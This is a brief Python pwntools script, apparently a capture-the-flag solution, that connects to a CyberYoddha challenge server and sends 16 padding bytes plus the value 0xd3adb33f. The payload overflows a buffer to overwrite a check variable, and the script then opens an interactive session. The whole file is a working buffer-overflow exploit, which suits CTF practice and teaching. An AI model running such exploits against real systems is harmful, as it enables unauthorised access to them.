from pwn import *

p = remote("cyberyoddha.baycyber.net", 10003)

buf = b''
buf += b'A'*16
buf += p32(0xd3adb33f)
p.sendline(buf)

p.interactive()
